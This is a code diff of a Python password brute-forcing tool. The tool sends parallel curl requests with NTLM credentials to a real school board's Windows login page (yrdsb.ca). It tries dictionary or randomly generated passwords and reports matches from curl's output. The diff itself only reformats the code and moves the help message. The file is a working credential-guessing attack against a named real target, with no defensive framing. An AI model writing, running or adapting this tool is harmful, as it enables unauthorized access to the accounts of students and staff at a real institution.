@@ -1,12 +1,12 @@
 import random
 import subprocess
 from multiprocessing import Queue, Process, cpu_count, Pool, Manager
-import time
 import getopt
 import sys
 from colorama import Fore
 
 dictionary_file = ""
+
 
 def check_passwords1(username, passwords, result_queue):
     with Pool(cpu_count()) as pool:
@@ -16,14 +16,16 @@ def check_passwords1(username, passwords, result_queue):
             print(Fore.RED + f"[!!!] Valid password found: {result}")
             break
 
+
 def is_valid_password1(user, password, result_queue):
-    url = f'https://www.yrdsb.ca/_windows/default.aspx?ReturnUrl='
-    command = f'curl -k --ntlm -u "{user}:{password}" -o {user}.html "{url}"'
-    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+    result = subprocess.run(f'curl -k --ntlm -u "{user}:{password}" -o {user}.html '
+                            f'"https://www.yrdsb.ca/_windows/default.aspx?ReturnUrl="', shell=True,
+                            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
     print("[+] Testing for password: " + password)
     if "100   120  100   120    0     0" in result.stderr:
         print(Fore.WHITE + f"[!!!] Valid password found: {password}")
         result_queue.put(password)
+
 
 def is_valid_password(user, password_queue, result_queue):
     while True:
@@ -37,7 +39,6 @@ def is_valid_password(user, password_queue, result_queue):
         if "100   120  100   120    0     0" in result.stderr:
             print(Fore.WHITE + f"[!!!] Valid password found: {password}")
             result_queue.put(password)
-
 
 
 def generate_passwords(num_passwords, password_queue):
@@ -129,14 +130,6 @@ __   _____________  ___________  ______                                   _   __
   \_/ \_| \_|___/  \____/\____/  \_|  \__,_|___/___/ \_/\_/ \___/|_|  \__,_|  \____/_|  \__,_|\___|_|\_
 
 --------------------------------------------------------------------------------------------------------------""")
-    if any(opt in ('--help', '-h') for opt, _ in opts):
-        print(Fore.GREEN + "-h --help:\n"
-                           f"[~] Usage: python {sys.argv[0]} -u username -p password-list "
-                           "\n--------------------------------------------------------------------------------------------------------------"
-                           f"\nBrute Force --> python {sys.argv[0]} -u username -b -n amount-of-passwords"
-                           f"\nSimple mode --> {sys.argv[0]} --simple"
-                           "\n--------------------------------------------------------------------------------------------------------------"
-              )
 
     if any(opt in ('--username', '-u') for opt, _ in opts):
         try:
@@ -157,6 +150,13 @@ __   _____________  ___________  ______                                   _   __
             print(
                 Fore.RED + "[-] You need to have a password (--passwords or -p) list, or a brute-force (--brute-force or -b) attack option.")
             exit()
+
+    elif any(opt in ('--help', '-h') for opt, _ in opts):
+        print(Fore.GREEN + f"[~] Usage: python {sys.argv[0]} -u username -p password-list "
+                           "\n--------------------------------------------------------------------------------------------------------------"
+                           f"\n[~] Brute Force --> python {sys.argv[0]} -u username -b -n amount-of-passwords"
+                           f"\n[~] Simple mode --> {sys.argv[0]} --simple"
+                           "\n--------------------------------------------------------------------------------------------------------------" + Fore.LIGHTWHITE_EX)
     else:
         while True:
             jj = input(
